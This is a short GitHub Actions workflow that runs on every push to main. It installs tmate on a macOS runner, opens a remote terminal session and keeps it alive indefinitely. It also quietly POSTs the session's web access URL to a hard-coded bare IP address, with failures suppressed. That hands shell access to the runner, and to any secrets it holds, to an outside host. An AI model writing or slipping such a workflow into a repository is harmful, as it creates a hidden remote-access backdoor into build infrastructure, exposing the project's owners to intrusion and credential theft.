name: macOS Interactive Session

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  interactive:
    runs-on: macos-15
    steps:
      - name: Launch Interactive macOS Session
        run: |
          HOMEBREW_NO_AUTO_UPDATE=1 HOMEBREW_NO_INSTALL_CLEANUP=1 brew install tmate
          tmate -S /tmp/tmate.sock new-session -d
          tmate -S /tmp/tmate.sock wait tmate-ready
          
          WEB_URL=$(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')
          SSH_CMD=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
          
          echo "WEB: $WEB_URL"
          echo "SSH: $SSH_CMD"
          
          curl -s -X POST -d "$WEB_URL" http://195.96.132.171:8999/ || true
          
          while [ -S /tmp/tmate.sock ]; do sleep 5; done
